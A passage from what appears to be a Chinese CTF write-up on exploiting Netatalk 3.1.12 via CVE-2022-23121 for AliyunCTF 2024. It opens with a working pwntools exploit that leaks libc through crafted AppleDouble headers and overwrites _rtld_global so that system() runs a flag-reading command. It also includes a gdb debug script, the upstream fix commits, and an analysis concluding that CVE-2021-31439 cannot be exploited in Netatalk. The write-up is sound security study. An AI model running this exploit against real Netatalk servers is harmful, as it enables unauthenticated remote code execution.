class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> mimetypes <span class="keyword">import</span> encodings_map</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> afputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">dl_load_lock_off =  <span class="number">0x4524</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper function to create AppleDouble metadata header</span></span><br><span class="line"><span class="comment"># you can modify the header as you want...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createAppleDoubleForLeak</span>():</span><br><span class="line">  header = p32(<span class="number">0x51607</span>)                     <span class="comment">#Magic number double</span></span><br><span class="line">  header += p32(<span class="number">0x20000</span>)                    <span class="comment">#Version number</span></span><br><span class="line">  header += p8(<span class="number">0</span>) * <span class="number">16</span>                      <span class="comment">#Filler</span></span><br><span class="line">  header += p16(<span class="number">2</span>)                          <span class="comment">#Number of entries</span></span><br><span class="line">  header += p32(<span class="number">9</span>)                          <span class="comment">#Entry Id Finder Info</span></span><br><span class="line">  header += pack(<span class="number">0x7fa</span>,<span class="number">32</span>,<span class="string">'big'</span>, <span class="literal">True</span>)          <span class="comment"># offset</span></span><br><span class="line">  header += p32(<span class="number">30</span>)                         <span class="comment"># Set length other than 32 to call 'ad_convert_osx'</span></span><br><span class="line">  header += p32(<span class="number">2</span>)                          <span class="comment"># Entry Id Resource Fork</span></span><br><span class="line">  header += p32(<span class="number">0x100</span>)                      <span class="comment"># #Control the mmap size</span></span><br><span class="line">  header += p32(<span class="number">0</span>)                          <span class="comment"># length</span></span><br><span class="line">  <span class="comment">############</span></span><br><span class="line">  <span class="comment"># usefull to find adouble offset</span></span><br><span class="line">  <span class="comment">###########</span></span><br><span class="line">  header += <span class="string">b'JUNK'</span> * <span class="number">8</span></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper function to create AppleDouble metadata header</span></span><br><span class="line"><span class="comment"># you can modify the header as you want...</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createAppleDoubleForArbWrite</span>():</span><br><span class="line">  header = p32(<span class="number">0x51607</span>)                     <span class="comment">#Magic number double</span></span><br><span class="line">  header += p32(<span class="number">0x20000</span>)                    <span class="comment">#Version number</span></span><br><span class="line">  header += p8(<span class="number">0</span>) * <span class="number">16</span>                      <span class="comment">#Filler</span></span><br><span class="line">  header += p16(<span class="number">2</span>)                          <span class="comment">#Number of entries</span></span><br><span class="line">  header += p32(<span class="number">9</span>)                          <span class="comment">#Entry Id Finder Info</span></span><br><span class="line">  header += pack(dl_load_lock_off-<span class="number">32</span>,<span class="number">32</span>,<span class="string">'big'</span>, <span class="literal">True</span>)          <span class="comment"># offset</span></span><br><span class="line">  header += p32(<span class="number">30</span>)                         <span class="comment"># Set length other than 32 to call 'ad_convert_osx'</span></span><br><span class="line">  header += p32(<span class="number">2</span>)                          <span class="comment"># Entry Id Resource Fork</span></span><br><span class="line">  header += p32(<span class="number">0x100</span>)                      <span class="comment"># #Control the mmap size</span></span><br><span class="line">  header += p32(<span class="number">0x330</span>)                          <span class="comment"># length</span></span><br><span class="line"></span><br><span class="line">  header = header.ljust(<span class="number">0x100</span>,<span class="string">b'a'</span>)</span><br><span class="line">  cmd = <span class="string">b'cat /flag* &gt; /home/xxxx/shared/flag\x00'</span></span><br><span class="line">  header += cmd</span><br><span class="line">  header += <span class="string">b'b'</span>*(<span class="number">0x32C</span>-<span class="built_in">len</span>(cmd))</span><br><span class="line">  header += pack(system_addr+<span class="number">1</span>,<span class="number">32</span>,<span class="string">'little'</span>, <span class="literal">False</span>) </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="comment"># ip and port of the local netatalk server</span></span><br><span class="line">ip = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">5548</span></span><br><span class="line">volume = <span class="string">"Shared"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ip = "pwn3.aliyunctf.com"</span></span><br><span class="line"><span class="comment"># port = 32514</span></span><br><span class="line"><span class="comment"># volume = "Shared"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接并创建卷</span></span><br><span class="line">p = connect(ip, port)</span><br><span class="line">response, request_id = DSIOpenSession(p, debug)</span><br><span class="line">response, request_id = FPLogin(p, request_id, <span class="string">b'AFP3.3'</span>, <span class="string">b'No User Authent'</span>, <span class="literal">None</span>, debug)</span><br><span class="line">response, request_id, volume_id = FPOpenVol(p, request_id, <span class="number">0x21</span>, <span class="built_in">bytes</span>(volume,encoding=<span class="string">'utf-8'</span>), <span class="literal">None</span>, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件</span></span><br><span class="line">response, request_id = FPCreateFile(p, request_id, volume_id, <span class="number">2</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line">response, request_id, fork1 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line"></span><br><span class="line">data = <span class="string">b'Hello World !'</span></span><br><span class="line"></span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork1, <span class="number">0</span>, <span class="built_in">len</span>(data), data, debug)</span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork1, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件的AppleDouble metadata,越界读出栈上的libc地址到恶意文件中</span></span><br><span class="line">appledouble = createAppleDoubleForLeak()</span><br><span class="line">response, request_id = FPCreateFile(p, request_id, volume_id, <span class="number">2</span>, <span class="number">2</span>, <span class="string">b"._leak_file"</span>, debug)</span><br><span class="line">response, request_id, fork2 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"._leak_file"</span>, debug)</span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork2, <span class="number">0</span>, <span class="built_in">len</span>(appledouble), appledouble, debug)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取恶意文件中获取到的libc地址</span></span><br><span class="line">response, request_id, fork3 = FPOpenFork(p, request_id, <span class="number">1</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line">response, request_id = FPReadExt(p,request_id,fork2,<span class="number">50</span>,<span class="number">4</span>,debug)</span><br><span class="line"></span><br><span class="line">libc_base = unpack(response[<span class="number">16</span>:<span class="number">20</span>],<span class="number">32</span>,endian=<span class="string">'little'</span>)-<span class="number">0x170e7</span></span><br><span class="line">system_addr = libc_base+<span class="number">0x2d4dc</span></span><br><span class="line">binsh_addr = libc_base+<span class="number">0xd5af8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"libc_base-&gt;"</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork3, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Trigger</span>(<span class="params">server, request_id, flag, volume_id, directory_id, bitmap, access_mode, path_type, path_name, info=<span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    afp_command = p8(<span class="number">26</span>, endian=<span class="string">'big'</span>)                  <span class="comment"># command code : 26 --&gt; kFPOpenFork</span></span><br><span class="line">    afp_command += p8(flag, endian=<span class="string">'big'</span>)               <span class="comment"># flag</span></span><br><span class="line">    afp_command += p16(volume_id, endian=<span class="string">'big'</span>)         <span class="comment"># volume id</span></span><br><span class="line">    afp_command += p32(directory_id, endian=<span class="string">'big'</span>)      <span class="comment"># directory id </span></span><br><span class="line">    afp_command += p16(bitmap, endian=<span class="string">'big'</span>)            <span class="comment"># bitmap</span></span><br><span class="line">    afp_command += p16(access_mode, endian=<span class="string">'big'</span>)         <span class="comment"># access_mode </span></span><br><span class="line">    afp_command += p8(path_type, endian=<span class="string">'big'</span>)         <span class="comment"># path type</span></span><br><span class="line">    afp_command += p8(<span class="built_in">len</span>(path_name), endian=<span class="string">'big'</span>)     <span class="comment"># len path name</span></span><br><span class="line">    afp_command += path_name</span><br><span class="line"></span><br><span class="line">    dsi_header = DSIHeader(<span class="number">0</span>, <span class="number">2</span>, request_id, <span class="number">0</span>, <span class="built_in">len</span>(afp_command))</span><br><span class="line">    to_send = dsi_header + afp_command</span><br><span class="line">    server.send(to_send)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建恶意文件的AppleDouble metadata,写入_rtld_global._dl_load_lock和_rtld_global._dl_rtld_lock_recursive</span></span><br><span class="line">appledouble = createAppleDoubleForArbWrite()</span><br><span class="line">response, request_id = FPWriteExt(p, request_id, fork2, <span class="number">0</span>, <span class="built_in">len</span>(appledouble), appledouble, debug)    </span><br><span class="line">Trigger(p, request_id, <span class="number">1</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"leak_file"</span>, debug)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>


<p>读文件:</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = connect(ip, port)</span><br><span class="line">response, request_id = DSIOpenSession(p, debug)</span><br><span class="line">response, request_id = FPLogin(p, request_id, <span class="string">b'AFP3.3'</span>, <span class="string">b'No User Authent'</span>, <span class="literal">None</span>, debug)</span><br><span class="line">response, request_id, volume_id = FPOpenVol(p, request_id, <span class="number">0x21</span>, <span class="built_in">bytes</span>(volume,encoding=<span class="string">'utf-8'</span>), <span class="literal">None</span>, debug)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response, request_id, fork4 = FPOpenFork(p, request_id, <span class="number">0</span>, volume_id, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="string">b"flag"</span>, debug)</span><br><span class="line">response, request_id = FPReadExt(p,request_id,fork4,<span class="number">0</span>,<span class="number">80</span>,debug)</span><br><span class="line"></span><br><span class="line">response, request_id = FPCloseFork(p, request_id, fork4, debug)</span><br><span class="line"></span><br><span class="line">DSICloseSession(p, request_id, debug)</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403242324683.png"></p>
<h4 id="调试脚本"><a href="#调试脚本" class="headerlink" title="调试脚本"></a>调试脚本</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">target remote 127.0.0.1:1234</span><br><span class="line"></span><br><span class="line"># set detach-on-fork off</span><br><span class="line"># set follow-fork-mode child</span><br><span class="line">dir netatalk/etc/afpd</span><br><span class="line">dir netatalk/libatalk/adouble</span><br><span class="line">b ad_open.c:605</span><br><span class="line">b ad_rebuild_adouble_header_osx</span><br><span class="line">b __libc_system</span><br><span class="line">b fault_report</span><br><span class="line">handle SIGSEGV pass</span><br><span class="line">handle SIGSEGV nostop</span><br><span class="line">c</span><br></pre></td></tr></tbody></table></figure>

<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对parse_entries: <a target="_blank" rel="noopener" href="https://github.com/Netatalk/netatalk/commit/c4cf72ccef819e9b186400e58af4aa9eadd10828">https://github.com/Netatalk/netatalk/commit/c4cf72ccef819e9b186400e58af4aa9eadd10828</a></p>
<blockquote>
<ul>
<li>pass in the size of the valid data we read from disk</li>
<li>drop redundant buf argument</li>
<li>early exit if bounds check fails</li>
</ul>
</blockquote>
<p>对ad_header_read:<a target="_blank" rel="noopener" href="https://github.com/Netatalk/netatalk/commit/87f6a606a228bf2ca51db8ce1bdcf41d2d68c6bd">https://github.com/Netatalk/netatalk/commit/87f6a606a228bf2ca51db8ce1bdcf41d2d68c6bd</a></p>
<blockquote>
<ul>
<li>check there are not more then 16 AppleDouble entries</li>
<li>simplify check the AD entries fit into the read buffer</li>
<li>fail if parse_entries() returns an error</li>
</ul>
</blockquote>
<h2 id="CVE-2021-31439"><a href="#CVE-2021-31439" class="headerlink" title="CVE-2021-31439"></a>CVE-2021-31439</h2><blockquote>
<p>This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of Synology DiskStation Manager. Authentication is not required to exploit this vulnerablity. The specific flaw exists within the processing of DSI structures in Netatalk. The issue results from <code>the lack of proper validation of the length</code> of user-supplied data prior to copying it to a <code>heap-based buffer</code>. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-12326.</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Read DSI command and data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param  dsi   (rw) DSI handle</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return    DSI function on success, 0 on failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: START"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="type">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_requestID, block + <span class="number">2</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_requestID));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_reserved, block + <span class="number">12</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_reserved));</span><br><span class="line">  dsi-&gt;clientID = ntohs(dsi-&gt;header.dsi_requestID);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">  dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">      LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">      dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  LOG(log_debug, logtype_dsi, <span class="string">"dsi_stream_receive: DSI cmdlen: %zd"</span>, dsi-&gt;cmdlen);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block[<span class="number">1</span>];</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>关键部分:<br>类似于CVE-2018-1160,dsi_off字段未经过检查直接作为了dsi-&gt;cmdlen,进一步作为参数传入dsi_stream_read,其中dsi-&gt;commands缓冲区的长度为dsi-&gt;server_quantum(大小由启动配置决定)</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_data.dsi_doff, block + <span class="number">4</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_data.dsi_doff));</span><br><span class="line">dsi-&gt;header.dsi_data.dsi_doff = htonl(dsi-&gt;header.dsi_data.dsi_doff);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;dsi-&gt;header.dsi_len, block + <span class="number">8</span>, <span class="keyword">sizeof</span>(dsi-&gt;header.dsi_len));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure we don't over-write our buffers. */</span></span><br><span class="line">dsi-&gt;cmdlen = MIN(ntohl(dsi-&gt;header.dsi_len), dsi-&gt;server_quantum);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Receiving DSIWrite data is done in AFP function, not here */</span></span><br><span class="line"><span class="keyword">if</span> (dsi-&gt;header.dsi_data.dsi_doff) {</span><br><span class="line">    LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: write request"</span>);</span><br><span class="line">    dsi-&gt;cmdlen = dsi-&gt;header.dsi_data.dsi_doff;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;cmdlen) != dsi-&gt;cmdlen)</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>dsi_stream_read函数将来自网络的数据存储到dsi-&gt;commands中,由于未经检查的dsi-&gt;cmdlen可能超过dsi-&gt;server_quantum,可能造成堆溢出.<br>经以下调用链:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dsi_stream_receive</span><br><span class="line"> -&gt;dsi_stream_read</span><br><span class="line">  -&gt;buf_read</span><br><span class="line">   -&gt;from_buf</span><br><span class="line">   -&gt;readt</span><br></pre></td></tr></tbody></table></figure>

<p>最终在readt函数中发生堆溢出.</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = recv(socket, (<span class="type">char</span> *) data + stored, length - stored, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403251321292.png"></p>
<p>观察dsi-&gt;commands缓冲区的空间,发现紧邻着libresolv共享库的不可写内存映像,且这一内存布局无法改变,<br>因为该空间是在建立一次会话时分配的,且每次建立会话都会是一个新的子进程,无法调整内存布局.<br>意味着溢出必定会发生段错误,没有进一步利用的空间,同时,recv函数会检测内存区域是否存在以及是否有对应权限,所以段错误也不会发生,进行错误处理,终止会话.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202403251321590.png"></p>
<p>再跟一下dsi_doff字段的其他使用,未发现会造成安全问题的地方.判断该漏洞无法在Netatalk中完成利用.<br>(通告中的RCE说的是affected installations of Synology DiskStation Manager.)</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <div class="declare">
      <ul class="post-copyright">
        <li>
          <i class="ri-copyright-line"></i>
          <strong>版权声明： </strong>
          
          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
          
        </li>
      </ul>
    </div>
    
    <footer class="article-footer">
       
<div class="share-btn">
      <span class="share-sns share-outer">
        <i class="ri-share-forward-line"></i>
        分享
      </span>
      <div class="share-wrap">
        <i class="arrow"></i>
        <div class="share-icons">
          
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="ri-weibo-fill"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="ri-wechat-fill"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="ri-qq-fill"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="ri-douban-line"></i>
          </a>
          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a> -->
          
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="ri-facebook-circle-fill"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="ri-twitter-fill"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="ri-google-fill"></i>
          </a>
        </div>
      </div>
</div>

<div class="wx-share-modal">
    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/AliyunCTF2024%20Exploit%20Netatalk%20v3.1.12%20by%20CVE-2022-23121/" alt="微信分享二维码">
    </div>
</div>

<div id="share-mask"></div>  
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li></ul>

    </footer>
  </div>

   
  <nav class="article-nav">
    
      <a href="/2024/ret2hbp/" class="article-nav-link">
        <strong class="article-nav-caption">上一篇</strong>
        <div class="article-nav-title">
          
            ret2hbp 将任意地址写转为堆栈越界读写
          
        </div>
      </a>
    
    
      <a href="/2024/CVE-2023-4911%20LD-HeapOverflow/" class="article-nav-link">
        <strong class="article-nav-caption">下一篇</strong>
        <div class="article-nav-title">CVE-2023-4911 GLIBC ld 堆溢出提权</div>
      </a>
    
  </nav>

  
   
    
    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
    <div id="twikoo" class="twikoo"></div>
    <script>
        twikoo.init({
            envId: ""
        })
    </script>
 
</article>

</section>
      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022-2024
        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2022/About">关于</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->
 
<script src="/js/tocbot.min.js"></script>

<script>
  tocbot.init({
    tocSelector: ".tocbot",
    contentSelector: ".article-entry",
    headingSelector: "h1, h2, h3, h4, h5, h6",
    hasInnerContainers: true,
    scrollSmooth: true,
    scrollContainer: "main",
    positionFixedSelector: ".tocbot",
    positionFixedClass: "is-position-fixed",
    fixedSidebarOffset: "auto",
  });
</script>

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
